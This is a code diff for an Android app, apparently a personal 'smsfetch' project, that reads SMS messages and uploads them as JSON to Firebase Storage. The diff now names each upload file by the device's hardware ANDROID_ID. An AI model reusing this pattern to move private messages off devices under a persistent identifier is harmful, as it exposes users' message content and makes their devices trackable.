@@ -1,10 +1,12 @@
 package maurya.devansh.smsfetch
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.content.Context
 import android.content.SharedPreferences
 import android.net.Uri
 import android.os.Bundle
+import android.provider.Settings
 import android.util.Log
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -16,7 +18,7 @@ import com.google.firebase.firestore.ktx.firestore
 import com.google.firebase.ktx.Firebase
 import com.google.firebase.ml.naturallanguage.FirebaseNaturalLanguage
 import com.google.firebase.storage.FirebaseStorage
-import com.google.gson.Gson
+import com.google.gson.GsonBuilder
 import com.gun0912.tedpermission.PermissionListener
 import com.gun0912.tedpermission.TedPermission
 import kotlinx.android.synthetic.main.activity_main.*
@@ -55,7 +57,6 @@ class MainActivity : AppCompatActivity() {
                             sendSmsJson(enSmsList)
                             Toast.makeText(this@MainActivity, "Sending sms", Toast.LENGTH_SHORT).show()
                         }
-                        storeSmsInDB(enSmsList, prefs)
                         Log.i("SMS", enSmsList.toString())
                     }
                     else
@@ -103,27 +104,14 @@ class MainActivity : AppCompatActivity() {
         return smsList
     }
 
-    private fun storeSmsInDB(smsList: List<String>, prefs: SharedPreferences) {
-
-        val smsMap = mutableMapOf<String, List<String>>()
-        smsMap["sms"] = smsList
-
-        db.collection("sms").add(smsMap)
-            .addOnSuccessListener {
-                toast("${smsList.size} messages stored successfully")
-                prefs.edit {
-                    putBoolean(SMS_STORED, true)
-                }
-            }
-            .addOnFailureListener {
-                toast("Failed to store messages: $it")
-            }
-    }
-
+    @SuppressLint("HardwareIds")
     private fun sendSmsJson(smsList: List<String>) {
-        val fileName = "sms" + (Math.random()*1000).toInt() + ".json"
+
+        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+
+        val fileName = "sms$androidId.json"
         val file = File(filesDir, fileName)
-        Gson().toJson(smsList, FileWriter(file))
+        GsonBuilder().setPrettyPrinting().create().toJson(smsList, FileWriter(file))
         val stream = FileInputStream(file)
 
         val storageRef = storage.reference
